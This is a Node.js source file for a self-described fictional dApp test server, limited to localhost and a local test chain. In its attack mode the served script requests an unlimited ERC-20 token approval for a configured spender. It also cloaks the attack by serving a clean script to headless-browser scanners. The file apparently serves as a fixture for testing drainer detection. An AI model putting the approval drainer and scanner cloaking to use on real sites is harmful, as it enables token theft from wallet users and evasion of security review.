import http from 'node:http';
import { createHash } from 'node:crypto';
import { pathToFileURL } from 'node:url';

// Fictional dApp: the attack runs only on a local test chain after a click.
export function createHijackServer({mode, token, spender, scannerClean=false}) {
  if (!['clean','attack'].includes(mode) || typeof scannerClean!=='boolean' || !/^0x[0-9a-f]{40}$/.test(token) || !/^0x[0-9a-f]{40}$/.test(spender)) throw new Error('invalid demo configuration');
  const calldata = '0x095ea7b3' + spender.slice(2).padStart(64,'0') + 'f'.repeat(64);
  const cleanScript = `document.getElementById('request').addEventListener('click', async () => {
  const status = document.getElementById('status');
  try {
    if (!window.ethereum) throw new Error('No wallet provider');
    await window.ethereum.request({method:'eth_requestAccounts'});
    status.textContent = 'Connection requested';
  } catch (error) { status.textContent = String(error.message || error); }
});`;
  const attackScript = `document.getElementById('request').addEventListener('click', async () => {
  const status = document.getElementById('status');
  try {
    if (!window.ethereum) throw new Error('No wallet provider');
    if ((await window.ethereum.request({method:'eth_chainId'})) !== '0x7a69') throw new Error('Switch to local test chain 31337');
    const [from] = await window.ethereum.request({method:'eth_requestAccounts'});
    if ((await window.ethereum.request({method:'eth_chainId'})) !== '0x7a69') throw new Error('Chain changed; request cancelled');
    await window.ethereum.request({method:'eth_sendTransaction',params:[{from,to:${JSON.stringify(token)},data:${JSON.stringify(calldata)}}]});
    status.textContent = 'Request sent';
  } catch (error) { status.textContent = String(error.message || error); }
});`;
  const page = selected => `<!doctype html><html lang="en"><meta charset="utf-8"><title>BOUND fictional test site</title><h1>BOUND fictional test site</h1><button id="request">${selected === 'attack' ? 'Request test approval' : 'Connect wallet'}</button><pre id="status"></pre><script src="/app.js"></script></html>`;
  return http.createServer((req,res)=>{
    if (req.method !== 'GET' || (req.url !== '/' && req.url !== '/app.js')) { res.writeHead(404); res.end(); return; }
    const scanner=mode==='attack'&&scannerClean&&/HeadlessChrome/i.test(req.headers['user-agent']??'');
    const selected = scanner ? 'clean' : mode;
    if (req.url === '/') {
      res.writeHead(200,{'content-type':'text/html; charset=utf-8','cache-control':'no-store','x-content-type-options':'nosniff','vary':'User-Agent'}); res.end(page(selected));
    } else {
      const asset = selected === 'clean' ? cleanScript : attackScript;
      // The attack bytes also depend on the configured fixture addresses.
      const etag = '"' + createHash('sha256').update(asset).digest('hex') + '"';
      res.writeHead(200,{'content-type':'text/javascript; charset=utf-8','cache-control':'public, max-age=60','etag':etag,'x-content-type-options':'nosniff','vary':'User-Agent'}); res.end(asset);
    }
  });
}
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  const server=createHijackServer({mode:process.env.BOUND_DEMO_MODE ?? 'clean',token:process.env.BOUND_DEMO_TOKEN ?? '',spender:process.env.BOUND_DEMO_SPENDER ?? '',scannerClean:process.env.BOUND_DEMO_SCANNER_CLEAN === '1'});
  const port=Number(process.env.PORT ?? 8081);
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('invalid port');
  server.listen(port,'127.0.0.1',()=>console.log(`BOUND fictional test server listening on 127.0.0.1:${port}`));
}
